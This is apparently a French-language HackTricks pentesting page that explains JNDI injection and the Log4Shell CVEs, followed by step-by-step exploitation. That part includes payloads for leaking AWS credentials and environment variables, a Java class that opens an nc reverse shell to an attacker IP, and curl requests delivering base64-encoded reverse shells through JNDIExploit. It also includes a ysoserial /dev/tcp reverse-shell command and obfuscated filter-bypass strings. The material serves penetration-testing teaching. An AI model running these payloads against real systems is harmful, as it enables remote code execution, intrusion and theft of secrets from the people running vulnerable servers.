# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des probl√®mes dans l'ensemble de votre pile technologique, des API aux applications web et aux syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) d√®s aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informations de base

JNDI est pr√©sent dans Java depuis la fin des ann√©es 1990. Il s'agit d'un service de r√©pertoire qui **permet √† un programme Java de trouver des donn√©es via un service de noms**. Un service de noms associe des valeurs (liens), qui peuvent √™tre obtenues via leur r√©f√©rence dans le r√©pertoire.

JNDI dispose de plusieurs **interfaces de fournisseur de services** (SPI) qui lui permettent d'utiliser divers services de r√©pertoire. L'objectif de JNDI est d'obtenir facilement des donn√©es √† partir d'autres syst√®mes. Vous pouvez m√™me obtenir des objets Java √† distance, et c'est l√† qu'un probl√®me se pose.

Par exemple, des SPI existent pour le **CORBA COS** (Common Object Service), le **Java RMI** (Remote Method Interface) Registry et **LDAP**.

![](<../../.gitbook/assets/image (627).png>)

### R√©f√©rence de nom JNDI

Pour r√©cup√©rer des objets Java, vous pouvez les s√©rialiser et enregistrer leur repr√©sentation binaire. Mais il y a des cas o√π cela ne fonctionnera pas (peut-√™tre parce que les donn√©es sont trop volumineuses, ou pour toute autre raison).\
Afin de sauvegarder plus facilement des objets Java, on utilise des **r√©f√©rences de nom**.\
Il existe 2 types de r√©f√©rences de nom :

* **Adresses de r√©f√©rence** : cela indique l'adresse de l'objet (_rmi://serveur/ref_), puis l'**objet sera r√©cup√©r√© √† partir de cette adresse**.
* **Usine distante** : dans ce cas, une **classe d'usine distante** sera point√©e dans la r√©f√©rence JNDI, puis, en suivant l'adresse JNDI, la classe distante sera r√©cup√©r√©e √† partir de l'usine distante et la **classe sera t√©l√©charg√©e et charg√©e**.

Cela est dangereux car les **attaquants peuvent amener le syst√®me √† charger des objets arbitraires et √† ex√©cuter du code arbitraire**, c'est pourquoi certaines protections existent :

* **RMI** : `java.rmi.server.useCodeabseOnly = true` par d√©faut depuis **JDK 7u21**, sinon cela permettra de charger des objets Java personnalis√©s √† distance. De plus, m√™me si la protection est d√©sactiv√©e, un **gestionnaire de s√©curit√©** est appliqu√© pour configurer ce qui peut √™tre charg√©.
* **LDAP** : `com.sun.jndi.ldap.object.trustURLCodebase = false` par d√©faut depuis **JDK** **6u141, 7u131, 8u121**, et cela n'autorisera pas l'ex√©cution de java objects arbitraires t√©l√©charg√©s. Mais si cela est d√©fini sur `true`, cela le permettra et **aucun gestionnaire de s√©curit√© ne sera appliqu√©**.
* **CORBA** : Il n'y a pas de propri√©t√© √† configurer mais le **gestionnaire de s√©curit√© est toujours appliqu√©**.

De plus, le **Gestionnaire de noms**, celui qui va suivre les liens JNDI, n'a pas de gestionnaire de s√©curit√© ni de propri√©t√© √† configurer, il essaiera donc toujours d'obtenir l'objet.

Comme vous pouvez le voir, les **protections en g√©n√©ral ne sont pas suffisantes** car il n'y a **aucune protection contre le chargement de JNDI √† partir d'adresses al√©atoires** et les protections de RMI, LDAP et CORBA peuvent √™tre contourn√©es (selon la configuration) pour **charger des objets Java arbitraires** ou pour **charger des objets Java** qui exploiteront les composants existants dans l'application en tant que **gadgets pour ex√©cuter du code arbitraire**.

Exemple d'URLs pour exploiter JNDI :

* _rmi://serveur-attaquant/bar_
* _ldap://serveur-attaquant/bar_
* _iiop://serveur-attaquant/bar_

### Exemple JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

M√™me si vous avez d√©fini un **`PROVIDER_URL`**, vous pouvez indiquer un autre dans une recherche et y acc√©der : `ctx.lookup("<url-contr√¥l√©e-par-l'attaquant>")` et c'est ce que l'attaquant exploitera pour charger des objets arbitraires √† partir d'un syst√®me contr√¥l√© par lui.
### CORBA

Un **Interoperable Object Reference (IOR)** est une r√©f√©rence CORBA ou RMI-IIOP qui identifie de mani√®re unique un objet sur un serveur CORBA distant. Les IOR peuvent √™tre au format binaire ou sous forme de repr√©sentation hexad√©cimale de la cha√Æne binaire.\
Parmi les autres informations, il contient l'**ID de type** (un identifiant unique pour une interface) et le **Codebase** (emplacement distant utilis√© pour obtenir la classe stub).\
Notez que **par d√©faut, CORBA ne peut pas √™tre abus√©**.\
Cela n√©cessite :

* L'installation d'un **gestionnaire de s√©curit√©**
* La connexion √† la **base de code contr√¥l√©e par l'attaquant doit √™tre autoris√©e** par le gestionnaire de s√©curit√©. Il existe diff√©rentes fa√ßons de le permettre :
* Autorisation de socket : `permissions java.net.SocketPermission "*:1098-1099", "connect";`
* Autorisation de fichier permettant de lire tous les fichiers : `permission java.io.FilePermission "<<ALL FILES>>", "read";`
* Autorisation de fichier pour lire le dossier o√π l'attaquant peut t√©l√©charger les exploits (classes ou archive zip)

Vous pouvez trouver des **politiques de fournisseurs permettant cela par d√©faut**.

### RMI

Comme indiqu√© dans la section pr√©c√©dente **JNDI Naming Reference**, RMI par d√©faut ne permettra pas de t√©l√©charger des classes Java arbitraires. De plus, m√™me s'il le permettait, vous devrez **contourner les politiques du gestionnaire de s√©curit√©** (dans la section pr√©c√©dente, nous avons appris que cela √©tait possible avec CORBA).

### LDAP

Tout d'abord, nous devons distinguer entre une recherche et une recherche de nom.\
Une **recherche** utilisera une URL comme `ldap://localhost:389/o=JNDITutorial` pour trouver l'objet JNDITutorial √† partir d'un serveur LDAP et **r√©cup√©rer ses attributs**.\
Une **recherche de nom** est destin√©e aux **services de nommage** car nous voulons obtenir **tout ce qui est li√© √† un nom**.

Si la recherche LDAP a √©t√© invoqu√©e avec **SearchControls.setReturningObjFlag() avec `true`, alors l'objet retourn√© sera reconstruit**.

Par cons√©quent, il existe plusieurs fa√ßons d'attaquer ces options.\
Un **attaquant peut empoisonner les enregistrements LDAP en y introduisant des charges utiles** qui seront ex√©cut√©es dans les syst√®mes qui les collectent (tr√®s utile pour **compromettre des dizaines de machines** si vous avez acc√®s au serveur LDAP). Une autre fa√ßon d'exploiter cela serait de r√©aliser une **attaque MitM dans une recherche LDAP** par exemple.

Dans le cas o√π vous pouvez **faire r√©soudre une URL LDAP JNDI par une application**, vous pouvez contr√¥ler l'LDAP qui sera recherch√©, et vous pourriez renvoyer l'exploit (log4shell).

#### Exploitation de la d√©s√©rialisation

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

L'**exploit est s√©rialis√©** et sera d√©s√©rialis√©.\
Dans le cas o√π `trustURLCodebase` est `true`, un attaquant peut fournir ses propres classes dans la base de code, sinon, il devra abuser des gadgets dans le classpath.

#### Exploitation de la r√©f√©rence JNDI

Il est plus facile d'attaquer cet LDAP en utilisant des **r√©f√©rences JavaFactory** :

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Vuln√©rabilit√© Log4Shell

La vuln√©rabilit√© est introduite dans Log4j car il prend en charge une [**syntaxe sp√©ciale**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) sous la forme `${prefix:name}` o√π `prefix` est l'un des diff√©rents [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) o√π `name` doit √™tre √©valu√©. Par exemple, `${java:version}` est la version actuelle de Java en cours d'ex√©cution.

Dans [**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313), un Lookup `jndi` a √©t√© ajout√© comme suit : "Le JndiLookup permet de r√©cup√©rer des variables via JNDI. Par d√©faut, la cl√© sera pr√©fix√©e par java:comp/env/, cependant, si la cl√© contient un **":" aucun pr√©fixe ne sera ajout√©**."

Avec un **: pr√©sent** dans la cl√©, comme dans `${jndi:ldap://example.com/a}`, il n'y a **pas de pr√©fixe** et le **serveur LDAP est interrog√© pour l'objet**. Et ces Lookups peuvent √™tre utilis√©s √† la fois dans la configuration de Log4j et lors de l'enregistrement des lignes.

Par cons√©quent, la seule chose n√©cessaire pour obtenir une **ex√©cution de code √† distance (RCE) est une version vuln√©rable de Log4j traitant des informations contr√¥l√©es par l'utilisateur**. Et comme il s'agit d'une biblioth√®que largement utilis√©e par les applications Java pour enregistrer des informations (y compris les applications orient√©es Internet), il √©tait tr√®s courant d'avoir des journaux log4j enregistrant par exemple les en-t√™tes HTTP re√ßus comme l'User-Agent. Cependant, log4j n'est **pas utilis√© uniquement pour enregistrer des informations HTTP, mais aussi toute entr√©e** et donn√©es indiqu√©es par le d√©veloppeur.

## CVE Log4Shell

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critique]** : La vuln√©rabilit√© originale 'Log4Shell' est une faille de **d√©s√©rialisation non fiable**. Class√©e comme critique en termes de gravit√©, celle-ci obtient un score de 10 sur l'√©chelle [CVSS](https://www.first.org/cvss/) et **accorde des capacit√©s d'ex√©cution de code √† distance (RCE) aux attaquants non authentifi√©s**, permettant une prise de contr√¥le compl√®te du syst√®me.\
\
Signal√©e par Chen Zhaojun de l'√©quipe de s√©curit√© d'Alibaba Cloud √† Apache le 24 novembre, CVE-2021-44228 affecte les configurations par d√©faut de plusieurs frameworks Apache, notamment Apache Struts2, Apache Solr, Apache Druid, Apache Flink, et d'autres.\
\
√âtant la plus dangereuse de toutes, cette vuln√©rabilit√© se cache dans le composant [log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core), limit√© aux versions 2.x : de 2.0-beta9 jusqu'√† 2.14.1 inclus. Un correctif pour Log4Shell a √©t√© d√©ploy√© dans la version 2.15.0 mais jug√© incomplet (continuez √† lire).\
\
L'analyste en renseignement sur les menaces Florian Roth a partag√© des r√®gles Sigma \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)] qui peuvent √™tre utilis√©es comme l'une des d√©fenses.\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Critique**, pr√©c√©demment Faible] : Il s'agit d'une faille de **D√©ni de Service (DoS)** avec un score de ~~3.7~~ 9.0. La faille est apparue suite √† un **correctif incomplet** qui a √©t√© appliqu√© √† la version 2.15.0 pour CVE-2021-44228. Bien que le correctif appliqu√© √† la version 2.15.0 ait largement r√©solu la faille, ce n'√©tait pas tout √† fait le cas pour certaines **configurations non par d√©faut**.\
\
Log4j 2.15.0 fait "un effort maximal" pour **restreindre les recherches JNDI LDAP √† \_localhost**\_ par d√©faut. Cependant, les **attaquants** qui ont **le contr√¥le** sur les donn√©es d'entr√©e du **Thread Context Map (MDC)** peuvent cr√©er des charges utiles malveillantes via les motifs de recherche JNDI pour provoquer des attaques DoS. Cela s'applique aux configurations non par d√©faut dans lesquelles un mod√®le de mise en page non par d√©faut utilisant soit une recherche de contexte, par exemple \$${ctx:loginId}, soit un mod√®le de Thread Context Map (%X, %mdc, ou %MDC).\
\
La **bypass pris √† partir de ce** [**tweet**](https://twitter.com/marcioalm/status/1471740771581652995) √©tait :\
_Voici un PoC sur la fa√ßon de contourner les v√©rifications allowedLdapHost et allowedClasses dans Log4J 2.15.0 pour obtenir une RCE : **`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`** et pour contourner allowedClasses, il suffit de choisir un nom de classe dans le JDK. La d√©s√©rialisation se produira comme d'habitude._\
\_\_\
\_\_"Log4j 2.16.0 r√©sout ce probl√®me en supprimant la prise en charge des mod√®les de recherche de messages et en d√©sactivant la fonctionnalit√© JNDI par d√©faut", indique l'avis du NVD. Pour ceux qui utilisent la branche 2.12.1, une correction a √©t√© r√©troport√©e dans la version 2.12.2.\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[√âlev√©e]** : Avons-nous dit que les versions Log4j 2.x √©taient vuln√©rables ? Et qu'en est-il de **Log4j 1.x** ?\
\
Bien que l'on pensait auparavant qu'il √©tait s√ªr, Log4Shell a trouv√© un moyen de se cacher dans l'ancienne version de Log4j √©galement. Essentiellement, **une configuration non par d√©faut des instances Log4j 1.x utilisant la classe \_JMSAppender**\_\*\* devient √©galement vuln√©rable √† la faille de d√©s√©rialisation non fiable\*\*.\
\
Bien qu'il s'agisse d'une variante moins grave de la CVE-2021-44228, cette CVE impacte n√©anmoins toutes les versions des composants [log4j:log4j](https://search.maven.org/artifact/log4j/log4j) et [org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j) pour lesquelles seules des versions 1.x existent. √âtant donn√© que ce sont des versions [en fin de vie](https://logging.apache.org/log4j/1.2/), **aucune correction pour la branche 1.x n'existe nulle part**, et il convient de passer √† la version 2.17.0 de _log4j-core_. (Apparemment, la version 1.0 n'est pas vuln√©rable).\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Mod√©r√©e]** : Il s'agit d'une vuln√©rabilit√© dans le **framework de journalisation Logback**. Successeur de la biblioth√®que Log4j 1.x, Logback pr√©tend prendre le relais l√† o√π log4j 1.x s'arr√™te.\
\
Jusqu'√† la semaine derni√®re, Logback se vantait √©galement d'√™tre "sans rapport avec log4j 2.x, \[logback] ne partage pas ses vuln√©rabilit√©s".\
\
Cette hypoth√®se a rapidement disparu lorsque la CVE-2021-4104 a √©t√© d√©couverte pour impacter √©galement Log4j 1.x, et la possibilit√© d'un impact potentiel sur Logback a √©t√© √©valu√©e. Les nouvelles versions plus r√©centes de Logback, 1.3.0-alpha11 et 1.2.9, qui corrigent cette vuln√©rabilit√© moins grave, ont maintenant √©t√© publi√©es.\\
* **CVE-2021-45105** **\[√âlev√©e]** : On a d√©couvert que **Log4j 2.16.0** √©tait **vuln√©rable √† une faille de DoS** class√©e '√âlev√©e' en termes de gravit√©. Apache a depuis **publi√© une version log4j 2.17.0** qui corrige la CVE. Plus de d√©tails sur cette √©volution sont fournis dans le dernier rapport de BleepingComputer.
* [**CVE-2021-44832**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) : Cette nouvelle CVE affecte la **version 2.17** de log4j. Cette vuln√©rabilit√© **n√©cessite que l'attaquant contr√¥le le fichier de configuration de log4j**, car il est possible d'indiquer une URL JDNI dans un JDBCAppender configur√©. Pour des informations sur la **vuln√©rabilit√© et son exploitation**, [**lisez ces informations**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Exploitation de Log4Shell

### D√©couverte

Cette vuln√©rabilit√© est tr√®s facile √† d√©couvrir car elle enverra au moins une **requ√™te DNS** √† l'adresse que vous indiquez dans votre charge utile. Par cons√©quent, des charges utiles telles que :

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (en utilisant [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (en utilisant [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (en utilisant Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (en utilisant [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (en utilisant [huntress](https://log4shell.huntress.com))

Notez que **m√™me si une requ√™te DNS est re√ßue, cela ne signifie pas que l'application est exploitable** (ou m√™me vuln√©rable), vous devrez essayer de l'exploiter.

{% hint style="info" %}
N'oubliez pas que pour **exploiter la version 2.15**, vous devez ajouter la **bypass de v√©rification de localhost** : ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **D√©couverte locale**

Recherchez les **versions locales vuln√©rables** de la biblioth√®que avec :
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **V√©rification**

Certaines des plateformes mentionn√©es pr√©c√©demment vous permettront d'ins√©rer des donn√©es variables qui seront enregistr√©es lorsqu'elles sont demand√©es.\
Cela peut √™tre tr√®s utile pour 2 choses :

* **V√©rifier** la vuln√©rabilit√©
* **Exfiltrer des informations** en exploitant la vuln√©rabilit√©

Par exemple, vous pourriez demander quelque chose comme :\
ou comme `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** et si une **requ√™te DNS est re√ßue avec la valeur de la variable d'environnement**, vous saurez que l'application est vuln√©rable.

D'autres informations que vous pourriez essayer de **fuir** :
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informations sur l'ex√©cution de code √† distance (RCE)

{% hint style="info" %}
Les h√¥tes ex√©cutant des versions de **JDK sup√©rieures √† 6u141, 7u131, 8u121 seront prot√©g√©s contre la charge de classe LDAP** mais **PAS contre la vectorisation de la d√©s√©rialisation**. Cela est d√ª au fait que `com.sun.jndi.ldap.object.trustURLCodebase` est d√©sactiv√© par d√©faut, ce qui emp√™che JNDI de charger une base de code √† distance √† l'aide de LDAP. Cependant, il est important de souligner que la d√©s√©rialisation et les fuites de variables sont toujours possibles.\
Cela signifie que pour **exploiter les versions mentionn√©es**, vous devrez **abuser d'un gadget de confiance** qui existe dans l'application Java (en utilisant ysoserial ou JNDIExploit par exemple). Mais pour exploiter les versions inf√©rieures, vous pouvez les amener √† charger et ex√©cuter des classes arbitraires (ce qui facilite l'attaque).

Pour **plus d'informations** (_comme les limitations sur les vecteurs RMI et CORBA_), **consultez la section de r√©f√©rence pr√©c√©dente sur JNDI Naming** ou [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec avec une charge utile personnalis√©e

_Cette astuce est enti√®rement tir√©e de la **bo√Æte THM :**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)\_\_

Pour cette exploitation, l'outil [**marshalsec**](https://github.com/mbechler/marshalsec) (t√©l√©chargez une [**version jar √† partir d'ici**](https://github.com/RandomRobbieBF/marshalsec-jar)) sera utilis√© pour cr√©er un serveur de renvoi LDAP afin de rediriger les connexions vers notre serveur HTTP secondaire o√π l'exploit sera servi :
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Nous voulons que la victime charge le code qui nous enverra un shell invers√©, donc vous pouvez cr√©er un fichier java appel√© Exploit.java avec le contenu suivant :

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

Cr√©ez le **fichier de classe** en ex√©cutant : `javac Exploit.java -source 8 -target 8`, puis ex√©cutez un **serveur HTTP** dans le m√™me r√©pertoire o√π le fichier de classe a √©t√© cr√©√© : `python3 -m http.server`.\
Le **serveur LDAP de marshalsec doit pointer vers ce serveur HTTP**.\
Ensuite, vous pouvez faire ex√©cuter la classe d'exploitation par le **serveur web vuln√©rable** en envoyant une charge utile comme suit :
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
### RCE - **JNDIExploit**

{% hint style="info" %}
Veuillez noter que si Java n'est pas configur√© pour charger un code distant √† l'aide de LDAP, cette exploitation personnalis√©e ne fonctionnera pas. Dans ce cas, vous devez abuser d'une classe de confiance pour ex√©cuter du code arbitraire.
{% endhint %}

Pour cet exemple, vous pouvez simplement ex√©cuter ce **serveur web vuln√©rable √† log4shell** sur le port 8080 : [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_dans le fichier README, vous trouverez comment l'ex√©cuter_). Cette application vuln√©rable enregistre avec une version vuln√©rable de log4shell le contenu de l'en-t√™te de requ√™te HTTP _X-Api-Version_.

Ensuite, vous pouvez t√©l√©charger le fichier jar **JNDIExploit** et l'ex√©cuter avec :
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Apr√®s avoir lu le code pendant seulement quelques minutes, dans _com.feihong.ldap.LdapServer_ et _com.feihong.ldap.HTTPServer_, vous pouvez voir comment les **serveurs LDAP et HTTP sont cr√©√©s**. Le serveur LDAP comprendra quelle charge utile doit √™tre servie et redirigera la victime vers le serveur HTTP, qui ex√©cutera l'exploit.\
Dans _com.feihong.ldap.gadgets_, vous pouvez trouver **quelques gadgets sp√©cifiques** qui peuvent √™tre utilis√©s pour ex√©cuter l'action souhait√©e (potentiellement ex√©cuter du code arbitraire). Et dans _com.feihong.ldap.template_, vous pouvez voir les diff√©rentes classes de mod√®les qui **g√©n√©reront les exploits**.

Vous pouvez voir tous les exploits disponibles avec **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Certains sont utiles :
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Donc, dans notre exemple, nous avons d√©j√† cette application Docker vuln√©rable en cours d'ex√©cution. Pour l'attaquer :
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Lors de l'envoi des attaques, vous verrez une sortie dans le terminal o√π vous avez ex√©cut√© **JNDIExploit-1.2-SNAPSHOT.jar**.

**N'oubliez pas de v√©rifier `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` pour d'autres options d'exploitation. De plus, si n√©cessaire, vous pouvez changer le port des serveurs LDAP et HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De mani√®re similaire √† l'exploit pr√©c√©dent, vous pouvez essayer d'utiliser [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) pour exploiter cette vuln√©rabilit√©.\
Vous pouvez g√©n√©rer les URL √† envoyer √† la victime en ex√©cutant :
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Cette attaque utilisant un objet Java g√©n√©r√© sur mesure fonctionnera dans des laboratoires comme la salle solaire THM. Cependant, cela ne fonctionnera g√©n√©ralement pas (car par d√©faut, Java n'est pas configur√© pour charger un code distant √† l'aide de LDAP), je pense que c'est parce qu'il n'exploite pas une classe de confiance pour ex√©cuter du code arbitraire._

### RCE - ysoserial & JNDI-Exploit-Kit

Cette option est vraiment utile pour attaquer les versions de Java configur√©es pour ne faire confiance qu'√† certaines classes sp√©cifi√©es et pas √† tout le monde. Par cons√©quent, **ysoserial** sera utilis√© pour g√©n√©rer des **s√©rialisations de classes de confiance** qui peuvent √™tre utilis√©es comme gadgets pour **ex√©cuter du code arbitraire** (_la classe de confiance exploit√©e par ysoserial doit √™tre utilis√©e par le programme Java victime pour que l'exploit fonctionne_).

En utilisant **ysoserial** ou [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified), vous pouvez cr√©er l'exploit de d√©s√©rialisation qui sera t√©l√©charg√© par JNDI :
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utilisez [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) pour g√©n√©rer des **liens JNDI** o√π l'exploit attendra les connexions des machines vuln√©rables. Vous pouvez servir **diff√©rentes exploitations qui peuvent √™tre g√©n√©r√©es automatiquement** par JNDI-Exploit-Kit ou m√™me vos **propres charges utiles de d√©s√©rialisation** (g√©n√©r√©es par vous-m√™me ou ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Maintenant, vous pouvez facilement utiliser un lien JNDI g√©n√©r√© pour exploiter la vuln√©rabilit√© et obtenir un **shell invers√©** en envoyant simplement √† une version vuln√©rable de log4j : **`${ldap://10.10.14.10:1389/generated}`**

### Contournements
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Scanners Automatiques

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
